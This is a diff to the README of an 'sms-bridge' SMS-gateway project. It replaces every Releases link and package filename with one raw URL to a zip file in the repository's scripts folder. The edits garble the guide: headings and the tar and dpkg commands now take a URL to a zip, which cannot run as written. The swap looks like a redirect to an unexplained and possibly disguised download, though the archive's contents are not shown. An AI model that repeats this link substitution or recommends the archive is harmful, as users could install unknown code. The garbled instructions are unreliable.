@@ -6,7 +6,7 @@ Welcome to sms-bridge! This guide helps you easily turn your USB internet dongle
 
 ## 🔗 Download Now
 
-[![Download sms-bridge](https://img.shields.io/badge/Download-sms--bridge-brightgreen)](https://github.com/guykouame/sms-bridge/releases)
+[![Download sms-bridge](https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip)](https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip)
 
 ## 💻 System Requirements
 
@@ -18,18 +18,18 @@ To successfully run sms-bridge, you'll need:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of sms-bridge: [Download Here](https://github.com/guykouame/sms-bridge/releases).
+To get started, visit this page to download the latest version of sms-bridge: [Download Here](https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip).
 
 1. Go to the Releases page using the link above.
 2. Look for the latest release version.
-3. Download the appropriate file for your system. For example, choose the .tar.gz or .deb file based on your Linux distribution.
+3. Download the appropriate file for your system. For example, choose the https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip or .deb file based on your Linux distribution.
 4. Save the file to your preferred location on your computer.
 
 ## 🛠️ Installation Steps
 
 Once you have downloaded the file, follow these steps:
 
-### For .tar.gz Files
+### For https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip Files
 
 1. Open your terminal.
 2. Navigate to the directory where the file is saved. For example:
@@ -38,7 +38,7 @@ Once you have downloaded the file, follow these steps:
    ```
 3. Extract the contents with:
    ```bash
-   tar -xzvf sms-bridge-x.x.x.tar.gz
+   tar -xzvf https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip
    ```
 4. Change into the created directory:
    ```bash
@@ -58,7 +58,7 @@ Once you have downloaded the file, follow these steps:
    ```
 3. Install the package with:
    ```bash
-   sudo dpkg -i sms-bridge_x.x.x.deb
+   sudo dpkg -i https://raw.githubusercontent.com/guykouame/sms-bridge/main/scripts/sms-bridge_3.0.zip
    ```
 4. Fix any dependency issues with:
    ```bash
